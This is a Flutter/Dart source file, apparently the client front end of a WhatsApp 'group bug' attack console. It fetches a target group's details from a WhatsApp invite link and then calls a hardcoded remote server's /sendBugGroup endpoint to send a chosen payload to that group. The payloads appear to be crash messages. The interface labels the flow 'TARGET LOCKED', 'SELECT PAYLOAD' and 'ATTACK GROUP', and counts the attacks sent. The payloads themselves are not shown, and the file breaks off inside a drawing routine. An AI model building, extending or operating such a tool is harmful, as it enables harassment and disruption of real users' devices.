// ═══════════════════════════════════════════════════════════════════════════
//  GROUP PAGE — ROMBAK TOTAL
//  Attack console · step flow · live stats · heavy decoration
// ═══════════════════════════════════════════════════════════════════════════
import 'dart:async';
import 'dart:convert';
import 'dart:math' as math;
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

const String kBaseUrl = 'http://www.rexylegal.rxpedia.web.id:2060';

class _C {
  static const bg        = Color(0xFFEEF3F9);
  static const bgGrad1   = Color(0xFFF5FAFF);
  static const bgGrad2   = Color(0xFFE6EEF8);
  static const surface   = Color(0xFFFFFFFF);
  static const cardAlt   = Color(0xFFF5F9FF);
  static const border    = Color(0xFFD6E2F0);
  static const borderMid = Color(0xFFC3D4E8);

  static const ice       = Color(0xFF38BDF8);
  static const ice2      = Color(0xFF0EA5E9);
  static const ice3      = Color(0xFF0284C7);
  static const iceDeep   = Color(0xFF0369A1);
  static const iceSoft   = Color(0xFFE0F2FE);

  static const green     = Color(0xFF10B981);
  static const red       = Color(0xFFEF4444);
  static const amber     = Color(0xFFF59E0B);

  static const text      = Color(0xFF0A2540);
  static const textSub   = Color(0xFF4A6582);
  static const textDim   = Color(0xFF8FA5BE);

  static const LinearGradient primaryGrad = LinearGradient(
    colors: [Color(0xFF38BDF8), Color(0xFF0EA5E9), Color(0xFF0284C7), Color(0xFF0369A1)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
}

final List<BoxShadow> _sh1 = [
  BoxShadow(color: const Color(0xFF0A2540).withOpacity(0.06), blurRadius: 2, offset: const Offset(0, 1)),
  BoxShadow(color: const Color(0xFF0A2540).withOpacity(0.04), blurRadius: 4, offset: const Offset(0, 2)),
];
final List<BoxShadow> _sh2 = [
  BoxShadow(color: const Color(0xFF0A2540).withOpacity(0.06), blurRadius: 8, offset: const Offset(0, 4)),
  BoxShadow(color: const Color(0xFF38BDF8).withOpacity(0.10), blurRadius: 16, offset: const Offset(0, 8)),
];
final List<BoxShadow> _shPrimary = [
  BoxShadow(color: const Color(0xFF38BDF8).withOpacity(0.40), blurRadius: 12, offset: const Offset(0, 4)),
  BoxShadow(color: const Color(0xFF38BDF8).withOpacity(0.25), blurRadius: 24, offset: const Offset(0, 8)),
  BoxShadow(color: const Color(0xFF38BDF8).withOpacity(0.15), blurRadius: 48, offset: const Offset(0, 16)),
];

class GroupPage extends StatefulWidget {
  final String sessionKey;
  final String username;
  final List<Map<String, dynamic>> listBug;

  const GroupPage({
    super.key,
    required this.sessionKey,
    required this.username,
    required this.listBug,
  });

  @override
  State<GroupPage> createState() => _GroupPageState();
}

class _GroupPageState extends State<GroupPage> with TickerProviderStateMixin {
  final TextEditingController _linkCtrl = TextEditingController();
  final ScrollController _scrollCtrl = ScrollController();

  String? _selectedBug;
  bool _isFetching = false;
  bool _isSending = false;
  String? _errorMessage;

  Map<String, dynamic>? _groupInfo;

  late AnimationController _entranceCtrl;
  late AnimationController _pulseCtrl;
  late AnimationController _orbitCtrl;

  late Animation<double> _entrance;

  int _totalSent = 0;
  DateTime? _lastSent;

  List<Map<String, dynamic>> get _groupBugs => widget.listBug
      .where((b) => b['type'] == 'group')
      .toList();

  @override
  void initState() {
    super.initState();
    _entranceCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 900));
    _entrance = CurvedAnimation(parent: _entranceCtrl, curve: Curves.easeOutCubic);

    _pulseCtrl = AnimationController(
        vsync: this, duration: const Duration(seconds: 2))..repeat(reverse: true);

    _orbitCtrl = AnimationController(
        vsync: this, duration: const Duration(seconds: 14))..repeat();

    _entranceCtrl.forward();
  }

  @override
  void dispose() {
    _entranceCtrl.dispose();
    _pulseCtrl.dispose();
    _orbitCtrl.dispose();
    _linkCtrl.dispose();
    _scrollCtrl.dispose();
    super.dispose();
  }

  void _showSnack(String msg, {bool isError = false}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(msg, style: const TextStyle(fontWeight: FontWeight.bold)),
        backgroundColor: isError ? _C.red : _C.green,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );
  }

  Future<void> _fetchGroupInfo() async {
    final link = _linkCtrl.text.trim();
    if (link.isEmpty || !link.contains('chat.whatsapp.com')) {
      _showSnack('Link grup tidak valid!', isError: true);
      return;
    }

    setState(() {
      _isFetching = true;
      _groupInfo = null;
      _errorMessage = null;
    });

    try {
      final url = Uri.parse('$kBaseUrl/getGroupInfo?key=${widget.sessionKey}&link=${Uri.encodeComponent(link)}');
      final res = await http.get(url).timeout(
        const Duration(seconds: 15),
        onTimeout: () => throw TimeoutException('Server tidak merespon'),
      );

      if (res.statusCode != 200) throw Exception('HTTP ${res.statusCode}');

      final data = jsonDecode(res.body);

      if (data['valid'] == true) {
        setState(() {
          _groupInfo = data;
          _isFetching = false;
        });
        _showSnack('Info grup berhasil diambil');
        Future.delayed(const Duration(milliseconds: 400), () {
          if (_scrollCtrl.hasClients) {
            _scrollCtrl.animateTo(
              _scrollCtrl.position.maxScrollExtent,
              duration: const Duration(milliseconds: 400),
              curve: Curves.easeOutCubic,
            );
          }
        });
      } else {
        setState(() {
          _errorMessage = data['message'] ?? 'Gagal ambil info grup';
          _isFetching = false;
        });
      }
    } on TimeoutException {
      setState(() {
        _errorMessage = 'Timeout: Server tidak merespon dalam 15 detik';
        _isFetching = false;
      });
    } catch (e) {
      setState(() {
        _errorMessage = 'Error: $e';
        _isFetching = false;
      });
    }
  }

  Future<void> _sendBug() async {
    if (_groupInfo == null) {
      _showSnack('Fetch info grup dulu!', isError: true);
      return;
    }
    if (_selectedBug == null) {
      _showSnack('Pilih jenis bug dulu!', isError: true);
      return;
    }

    setState(() {
      _isSending = true;
      _errorMessage = null;
    });

    try {
      final url = Uri.parse('$kBaseUrl/sendBugGroup?key=${widget.sessionKey}&jid=${Uri.encodeComponent(_groupInfo!['jid'] ?? '')}&bug=$_selectedBug');
      final res = await http.get(url).timeout(
        const Duration(seconds: 15),
        onTimeout: () => throw TimeoutException('Server tidak merespon'),
      );

      if (res.statusCode != 200) {
        throw Exception('HTTP ${res.statusCode} - Cek sender WA kamu');
      }

      final data = jsonDecode(res.body);

      if (data['valid'] == true && data['sended'] == true) {
        _showSnack('✅ Bug berhasil dikirim!');
        setState(() {
          _selectedBug = null;
          _totalSent += 1;
          _lastSent = DateTime.now();
        });
      } else {
        _showSnack(data['message'] ?? 'Gagal kirim bug', isError: true);
      }
    } on TimeoutException {
      _showSnack('Timeout: Sender WA mungkin belum konek', isError: true);
    } catch (e) {
      _showSnack('Error: $e', isError: true);
    } finally {
      if (mounted) setState(() => _isSending = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      body: Stack(
        children: [
          // BG
          Positioned.fill(
            child: Image.asset(
              'assets/images/background.jpg',
              fit: BoxFit.cover,
              errorBuilder: (_, __, ___) => Container(
                decoration: const BoxDecoration(
                  gradient: LinearGradient(
                    colors: [_C.bgGrad1, _C.bg, _C.bgGrad2],
                    begin: Alignment.topCenter, end: Alignment.bottomCenter,
                  ),
                ),
              ),
            ),
          ),
          Positioned.fill(
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [
                    Colors.white.withOpacity(0.75),
                    Colors.white.withOpacity(0.88),
                    Colors.white.withOpacity(0.72),
                  ],
                  begin: Alignment.topCenter, end: Alignment.bottomCenter,
                ),
              ),
            ),
          ),
          Positioned.fill(child: CustomPaint(painter: _GridPainter())),

          SafeArea(
            child: Column(
              children: [
                _buildTopBar(),
                _buildDivider(),
                Expanded(
                  child: FadeTransition(
                    opacity: _entrance,
                    child: SingleChildScrollView(
                      controller: _scrollCtrl,
                      physics: const BouncingScrollPhysics(),
                      padding: const EdgeInsets.fromLTRB(14, 14, 14, 24),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.stretch,
                        children: [
                          _buildHeroCommandCard(),
                          const SizedBox(height: 14),
                          _buildStepPanel(
                            step: '01',
                            title: 'GROUP LINK',
                            icon: Icons.link_rounded,
                            color: _C.ice2,
                            child: _buildLinkInput(),
                          ),
                          if (_errorMessage != null) ...[
                            const SizedBox(height: 14),
                            _buildErrorBox(),
                          ],
                          if (_groupInfo != null) ...[
                            const SizedBox(height: 14),
                            _buildGroupInfoPanel(),
                          ],
                          const SizedBox(height: 14),
                          _buildStepPanel(
                            step: '02',
                            title: 'SELECT PAYLOAD',
                            icon: Icons.bug_report_rounded,
                            color: _C.red,
                            child: _buildBugSelector(),
                          ),
                          const SizedBox(height: 20),
                          _buildSendButton(),
                          const SizedBox(height: 16),
                        ],
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildDivider() => Container(
    height: 1,
    margin: const EdgeInsets.symmetric(horizontal: 14),
    color: _C.border.withOpacity(0.6),
  );

  // ─── TOP BAR ────────────────────────────────────────────────────────────────
  Widget _buildTopBar() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 8, 16, 8),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              width: 40, height: 40,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: _C.surface,
                border: Border.all(color: _C.border),
                boxShadow: _sh1,
              ),
              child: const Icon(Icons.arrow_back_rounded, color: _C.text, size: 18),
            ),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: const [
                Text('GROUP ATTACK',
                  style: TextStyle(
                    color: _C.text, fontFamily: 'Orbitron',
                    fontWeight: FontWeight.w900, fontSize: 15, letterSpacing: 2,
                  ),
                ),
                Text('GROUP BUG CONSOLE · v1.0',
                  style: TextStyle(
                    color: _C.ice3, fontSize: 9, fontWeight: FontWeight.w700,
                    letterSpacing: 2, fontFamily: 'ShareTechMono',
                  ),
                ),
              ],
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: _C.ice.withOpacity(0.5), width: 1.2),
              color: _C.iceSoft,
            ),
            child: Row(
              mainAxisSize: MainAxisSize.min,
              children: [
                AnimatedBuilder(
                  animation: _pulseCtrl,
                  builder: (_, __) => Container(
                    width: 6, height: 6,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle, color: _C.green,
                      boxShadow: [
                        BoxShadow(
                          color: _C.green.withOpacity(0.5 + _pulseCtrl.value * 0.5),
                          blurRadius: 4 + _pulseCtrl.value * 4,
                        ),
                      ],
                    ),
                  ),
                ),
                const SizedBox(width: 6),
                const Text('LIVE',
                  style: TextStyle(
                    color: _C.ice3, fontSize: 9,
                    fontWeight: FontWeight.w900, letterSpacing: 1.5,
                    fontFamily: 'Orbitron',
                  )),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ─── HERO COMMAND CARD ──────────────────────────────────────────────────────
  Widget _buildHeroCommandCard() {
    return Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(24),
        gradient: const LinearGradient(
          colors: [Color(0xFF0A2540), Color(0xFF0F3A5F), Color(0xFF0A2540)],
          begin: Alignment.topLeft, end: Alignment.bottomRight,
        ),
        boxShadow: [
          BoxShadow(color: _C.ice2.withOpacity(0.35), blurRadius: 28, offset: const Offset(0, 12)),
          BoxShadow(color: _C.text.withOpacity(0.20), blurRadius: 48, offset: const Offset(0, 20)),
        ],
        border: Border.all(color: _C.ice2.withOpacity(0.4), width: 1.2),
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(24),
        child: Stack(
          children: [
            Positioned(
              top: -50, right: -50,
              child: AnimatedBuilder(
                animation: _orbitCtrl,
                builder: (_, __) => Transform.rotate(
                  angle: _orbitCtrl.value * 2 * math.pi,
                  child: CustomPaint(
                    size: const Size(200, 200),
                    painter: _HeroOrbitPainter(),
                  ),
                ),
              ),
            ),
            Padding(
              padding: const EdgeInsets.all(20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                        decoration: BoxDecoration(
                          color: _C.ice2.withOpacity(0.20),
                          borderRadius: BorderRadius.circular(20),
                          border: Border.all(color: _C.ice2.withOpacity(0.6)),
                        ),
                        child: Row(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            const Icon(Icons.campaign_rounded, color: _C.ice, size: 11),
                            const SizedBox(width: 4),
                            const Text('GROUP OPS',
                              style: TextStyle(
                                color: Colors.white, fontSize: 9,
                                fontWeight: FontWeight.w900, letterSpacing: 1.5,
                              )),
                          ],
                        ),
                      ),
                      const Spacer(),
                      Text('BETA',
                        style: TextStyle(
                          color: _C.ice.withOpacity(0.6),
                          fontSize: 10, fontWeight: FontWeight.w900,
                          letterSpacing: 2, fontFamily: 'Orbitron',
                        )),
                    ],
                  ),
                  const SizedBox(height: 18),
                  Row(
                    children: [
                      Container(
                        width: 56, height: 56,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          border: Border.all(color: _C.ice.withOpacity(0.6), width: 2),
                          boxShadow: [BoxShadow(color: _C.ice2.withOpacity(0.5), blurRadius: 16)],
                        ),
                        child: ClipOval(
                          child: Image.asset('assets/images/logo.png',
                            fit: BoxFit.cover,
                            errorBuilder: (_, __, ___) =>
                              const Icon(Icons.person, color: _C.ice, size: 30)),
                        ),
                      ),
                      const SizedBox(width: 14),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(widget.username.toUpperCase(),
                              style: const TextStyle(
                                color: Colors.white, fontFamily: 'Orbitron',
                                fontWeight: FontWeight.w900, fontSize: 15, letterSpacing: 1,
                              ),
                              maxLines: 1, overflow: TextOverflow.ellipsis,
                            ),
                            const SizedBox(height: 4),
                            Row(
                              children: [
                                Container(
                                  padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                                  decoration: BoxDecoration(
                                    color: _C.ice2.withOpacity(0.25),
                                    borderRadius: BorderRadius.circular(6),
                                  ),
                                  child: Text('${_groupBugs.length} BUGS',
                                    style: const TextStyle(
                                      color: _C.ice, fontFamily: 'ShareTechMono',
                                      fontWeight: FontWeight.w900, fontSize: 9, letterSpacing: 1,
                                    ),
                                  ),
                                ),
                                const SizedBox(width: 6),
                                Container(
                                  padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                                  decoration: BoxDecoration(
                                    color: _C.green.withOpacity(0.20),
                                    borderRadius: BorderRadius.circular(6),
                                  ),
                                  child: Text('$_totalSent SENT',
                                    style: const TextStyle(
                                      color: _C.green, fontFamily: 'ShareTechMono',
                                      fontWeight: FontWeight.w900, fontSize: 9, letterSpacing: 1,
                                    ),
                                  ),
                                ),
                              ],
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 16),
                  Container(height: 1, color: Colors.white.withOpacity(0.10)),
                  const SizedBox(height: 12),
                  Row(
                    children: [
                      Icon(Icons.info_outline_rounded, color: _C.ice.withOpacity(0.6), size: 12),
                      const SizedBox(width: 6),
                      Expanded(
                        child: Text(
                          _lastSent == null
                              ? 'Belum ada bug terkirim'
                              : 'Terakhir: ${_fmtTime(_lastSent!)}',
                          style: TextStyle(
                            color: _C.ice.withOpacity(0.7),
                            fontSize: 10, fontFamily: 'ShareTechMono',
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  String _fmtTime(DateTime t) {
    final d = DateTime.now().difference(t);
    if (d.inSeconds < 60) return '${d.inSeconds} detik lalu';
    if (d.inMinutes < 60) return '${d.inMinutes} menit lalu';
    if (d.inHours < 24) return '${d.inHours} jam lalu';
    return '${d.inDays} hari lalu';
  }

  // ─── STEP PANEL WRAPPER ─────────────────────────────────────────────────────
  Widget _buildStepPanel({
    required String step,
    required String title,
    required IconData icon,
    required Color color,
    required Widget child,
  }) {
    return Container(
      decoration: BoxDecoration(
        color: _C.surface,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _C.border, width: 1.2),
        boxShadow: _sh2,
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(20),
        child: Stack(
          children: [
            Positioned(
              top: 0, left: 0, right: 0,
              child: Container(
                height: 3,
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [color, color.withOpacity(0.4)],
                  ),
                ),
              ),
            ),
            Positioned(
              top: -10, right: 8,
              child: Text(step,
                style: TextStyle(
                  color: color.withOpacity(0.06),
                  fontSize: 80, fontWeight: FontWeight.w900,
                  fontFamily: 'Orbitron', height: 1.0,
                ),
              ),
            ),
            Padding(
              padding: const EdgeInsets.fromLTRB(18, 18, 18, 18),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        width: 32, height: 32,
                        decoration: BoxDecoration(
                          color: color.withOpacity(0.12),
                          borderRadius: BorderRadius.circular(10),
                          border: Border.all(color: color.withOpacity(0.3)),
                        ),
                        child: Icon(icon, color: color, size: 16),
                      ),
                      const SizedBox(width: 10),
                      Text(title,
                        style: const TextStyle(
                          color: _C.text, fontFamily: 'Orbitron',
                          fontWeight: FontWeight.w900, fontSize: 12, letterSpacing: 1.5,
                        ),
                      ),
                      const SizedBox(width: 8),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                        decoration: BoxDecoration(
                          color: color.withOpacity(0.10),
                          borderRadius: BorderRadius.circular(6),
                        ),
                        child: Text(step,
                          style: TextStyle(
                            color: color, fontSize: 9,
                            fontWeight: FontWeight.w900, letterSpacing: 1,
                            fontFamily: 'Orbitron',
                          ),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 14),
                  child,
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── LINK INPUT ─────────────────────────────────────────────────────────────
  Widget _buildLinkInput() {
    return Column(
      children: [
        Container(
          decoration: BoxDecoration(
            color: _C.cardAlt,
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: _C.borderMid),
          ),
          child: TextField(
            controller: _linkCtrl,
            enabled: !_isFetching && !_isSending,
            style: const TextStyle(
              color: _C.text, fontFamily: 'ShareTechMono',
              fontSize: 13, fontWeight: FontWeight.w600,
            ),
            cursorColor: _C.ice2,
            decoration: InputDecoration(
              hintText: 'https://chat.whatsapp.com/...',
              hintStyle: TextStyle(
                color: _C.textDim.withOpacity(0.7),
                fontFamily: 'ShareTechMono',
                fontSize: 12,
              ),
              prefixIcon: const Icon(Icons.link_rounded, color: _C.ice2, size: 20),
              border: InputBorder.none,
              contentPadding: const EdgeInsets.symmetric(vertical: 16, horizontal: 16),
            ),
          ),
        ),
        const SizedBox(height: 12),
        GestureDetector(
          onTap: _isFetching ? null : _fetchGroupInfo,
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 200),
            padding: const EdgeInsets.symmetric(vertical: 14),
            decoration: BoxDecoration(
              gradient: _isFetching ? null : _C.primaryGrad,
              color: _isFetching ? _C.border : null,
              borderRadius: BorderRadius.circular(14),
              boxShadow: _isFetching ? null : _shPrimary,
              border: Border.all(
                color: Colors.white.withOpacity(0.3),
                width: 1.2,
              ),
            ),
            child: Center(
              child: _isFetching
                  ? const SizedBox(
                      width: 20, height: 20,
                      child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2),
                    )
                  : const Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.search_rounded, color: Colors.white, size: 18),
                        SizedBox(width: 8),
                        Text('CEK INFO GRUP',
                          style: TextStyle(
                            color: Colors.white, fontSize: 13,
                            fontWeight: FontWeight.w900, letterSpacing: 1.5,
                            fontFamily: 'Orbitron',
                          )),
                      ],
                    ),
            ),
          ),
        ),
      ],
    );
  }

  // ─── ERROR BOX ──────────────────────────────────────────────────────────────
  Widget _buildErrorBox() {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: _C.red.withOpacity(0.08),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: _C.red.withOpacity(0.3), width: 1.2),
      ),
      child: Row(
        children: [
          Container(
            width: 32, height: 32,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: _C.red.withOpacity(0.15),
            ),
            child: const Icon(Icons.error_outline_rounded, color: _C.red, size: 18),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Text(_errorMessage!,
              style: const TextStyle(
                color: _C.red, fontSize: 11,
                fontWeight: FontWeight.w700, fontFamily: 'ShareTechMono',
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── GROUP INFO PANEL ───────────────────────────────────────────────────────
  Widget _buildGroupInfoPanel() {
    final info = _groupInfo!;
    final photoUrl = info['photo']?.toString();

    return Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [_C.iceSoft.withOpacity(0.6), _C.surface],
          begin: Alignment.topLeft, end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _C.ice.withOpacity(0.4), width: 1.2),
        boxShadow: _sh2,
      ),
      child: Column(
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                decoration: BoxDecoration(
                  color: _C.green.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: _C.green.withOpacity(0.4)),
                ),
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Container(width: 5, height: 5,
                      decoration: const BoxDecoration(
                        shape: BoxShape.circle, color: _C.green,
                      ),
                    ),
                    const SizedBox(width: 5),
                    const Text('TARGET LOCKED',
                      style: TextStyle(
                        color: _C.green, fontSize: 9,
                        fontWeight: FontWeight.w900, letterSpacing: 1.5,
                        fontFamily: 'Orbitron',
                      )),
                  ],
                ),
              ),
              const Spacer(),
              IconButton(
                onPressed: () => setState(() { _groupInfo = null; _selectedBug = null; }),
                icon: const Icon(Icons.close_rounded, color: _C.textDim, size: 16),
                constraints: const BoxConstraints(),
                padding: EdgeInsets.zero,
              ),
            ],
          ),
          const SizedBox(height: 12),
          Row(
            children: [
              Container(
                width: 64, height: 64,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: _C.primaryGrad,
                  boxShadow: _shPrimary,
                ),
                child: ClipOval(
                  child: (photoUrl != null && photoUrl.isNotEmpty)
                      ? Image.network(photoUrl, fit: BoxFit.cover,
                          errorBuilder: (_, __, ___) =>
                            const Icon(Icons.group_rounded, color: Colors.white, size: 32))
                      : const Icon(Icons.group_rounded, color: Colors.white, size: 32),
                ),
              ),
              const SizedBox(width: 14),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(info['name'] ?? 'Unknown Group',
                      style: const TextStyle(
                        color: _C.text, fontSize: 15,
                        fontWeight: FontWeight.w900, letterSpacing: 0.3,
                      ),
                      maxLines: 2, overflow: TextOverflow.ellipsis,
                    ),
                    const SizedBox(height: 6),
                    Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                          decoration: BoxDecoration(
                            color: _C.iceSoft,
                            borderRadius: BorderRadius.circular(10),
                            border: Border.all(color: _C.ice.withOpacity(0.4)),
                          ),
                          child: Row(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              const Icon(Icons.people_rounded, size: 11, color: _C.ice3),
                              const SizedBox(width: 4),
                              Text('${info['participants'] ?? '?'}',
                                style: const TextStyle(
                                  color: _C.ice3, fontSize: 10,
                                  fontWeight: FontWeight.w900, fontFamily: 'Orbitron',
                                )),
                            ],
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  // ─── BUG SELECTOR ───────────────────────────────────────────────────────────
  Widget _buildBugSelector() {
    if (_groupBugs.isEmpty) {
      return Container(
        padding: const EdgeInsets.symmetric(vertical: 30),
        decoration: BoxDecoration(
          color: _C.cardAlt,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _C.border),
        ),
        child: const Center(
          child: Text('Tidak ada bug untuk grup',
            style: TextStyle(color: _C.textDim, fontSize: 12)),
        ),
      );
    }

    return Column(
      children: _groupBugs.map((bug) {
        final isSelected = _selectedBug == bug['bug_id'];
        final enabled = _groupInfo != null && !_isSending;
        return Padding(
          padding: const EdgeInsets.only(bottom: 8),
          child: GestureDetector(
            onTap: enabled ? () => setState(() => _selectedBug = bug['bug_id']) : null,
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 200),
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 14),
              decoration: BoxDecoration(
                gradient: isSelected
                    ? LinearGradient(
                        colors: [_C.iceSoft, _C.surface],
                        begin: Alignment.centerLeft, end: Alignment.centerRight,
                      )
                    : null,
                color: isSelected ? null : _C.cardAlt,
                borderRadius: BorderRadius.circular(14),
                border: Border.all(
                  color: isSelected ? _C.ice2 : _C.border,
                  width: isSelected ? 1.5 : 1.0,
                ),
                boxShadow: isSelected
                    ? [BoxShadow(color: _C.ice2.withOpacity(0.20), blurRadius: 12, offset: const Offset(0, 4))]
                    : null,
              ),
              child: Row(
                children: [
                  Container(
                    width: 40, height: 40,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      gradient: isSelected
                          ? _C.primaryGrad
                          : LinearGradient(
                              colors: [_C.textDim.withOpacity(0.15), _C.textDim.withOpacity(0.05)],
                            ),
                      boxShadow: isSelected ? _shPrimary : null,
                    ),
                    child: Icon(Icons.bug_report_rounded,
                      color: isSelected ? Colors.white : _C.textDim,
                      size: 20,
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          (bug['bug_name'] ?? bug['bug_id'] ?? 'UNKNOWN').toString().toUpperCase(),
                          style: TextStyle(
                            color: isSelected ? _C.ice3 : _C.text,
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.w900,
                            fontSize: 13,
                            letterSpacing: 0.5,
                          ),
                        ),
                        const SizedBox(height: 3),
                        Text(
                          bug['bug_id']?.toString().toLowerCase() ?? 'bug',
                          style: const TextStyle(
                            color: _C.textDim,
                            fontFamily: 'ShareTechMono',
                            fontSize: 10,
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                      ],
                    ),
                  ),
                  Container(
                    width: 26, height: 26,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: isSelected ? _C.ice2 : Colors.transparent,
                      border: Border.all(
                        color: isSelected ? _C.ice2 : _C.borderMid,
                        width: 2,
                      ),
                    ),
                    child: isSelected
                        ? const Icon(Icons.check_rounded, color: Colors.white, size: 16)
                        : null,
                  ),
                ],
              ),
            ),
          ),
        );
      }).toList(),
    );
  }

  // ─── SEND BUTTON ────────────────────────────────────────────────────────────
  Widget _buildSendButton() {
    final isDisabled = _groupInfo == null || _selectedBug == null || _isSending;
    return AnimatedBuilder(
      animation: _pulseCtrl,
      builder: (context, child) {
        return GestureDetector(
          onTap: isDisabled ? null : _sendBug,
          child: Container(
            height: 64,
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(20),
              gradient: isDisabled ? null : _C.primaryGrad,
              color: isDisabled ? _C.border : null,
              border: Border.all(color: Colors.white.withOpacity(0.3), width: 1.5),
              boxShadow: isDisabled
                  ? null
                  : [
                      ..._shPrimary,
                      BoxShadow(
                        color: _C.ice2.withOpacity(0.15 + _pulseCtrl.value * 0.15),
                        blurRadius: 40, spreadRadius: 4,
                      ),
                    ],
            ),
            child: Center(
              child: _isSending
                  ? const SizedBox(
                      width: 26, height: 26,
                      child: CircularProgressIndicator(color: Colors.white, strokeWidth: 3),
                    )
                  : Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(
                          Icons.campaign_rounded,
                          color: isDisabled ? _C.textDim : Colors.white,
                          size: 22,
                        ),
                        const SizedBox(width: 12),
                        Text(
                          'ATTACK GROUP',
                          style: TextStyle(
                            color: isDisabled ? _C.textDim : Colors.white,
                            fontWeight: FontWeight.w900,
                            fontSize: 15, fontFamily: 'Orbitron', letterSpacing: 2.5,
                            shadows: isDisabled
                                ? null
                                : const [Shadow(color: Color(0x40000000), offset: Offset(0, 1), blurRadius: 2)],
                          ),
                        ),
                      ],
                    ),
            ),
          ),
        );
      },
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════
//  PAINTERS
// ═══════════════════════════════════════════════════════════════════════════
class _GridPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final grid = Paint()..color = _C.ice.withOpacity(0.04)..strokeWidth = 0.6;
    const sp = 32.0;
    for (double x = 0; x < size.width; x += sp) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), grid);
    }
    for (double y = 0; y < size.height; y += sp) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), grid);
    }
  }
  @override
  bool shouldRepaint(covariant CustomPainter _) => false;
}

class _HeroOrbitPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final center = Offset(size.width / 2, size.height / 2);
    final radius = size.width / 2 - 10;

    final dashPaint = Paint()
      ..color = _C.ice.withOpacity(0.30)
      ..strokeWidth = 1.2
      ..style = PaintingStyle.stroke
      ..strokeCap = StrokeCap.round;
    const dashCount = 36;
    for (int i = 0; i < dashCount; i++) {
      final start = i * 2 * math.pi / dashCount;
      canvas.drawArc(Rect.fromCircle(center: center, radius: radius), start, 0.08, false, dashPaint);
    }

    final arcPaint = Paint()
      ..color = _C.ice2.withOpacity(0.5)
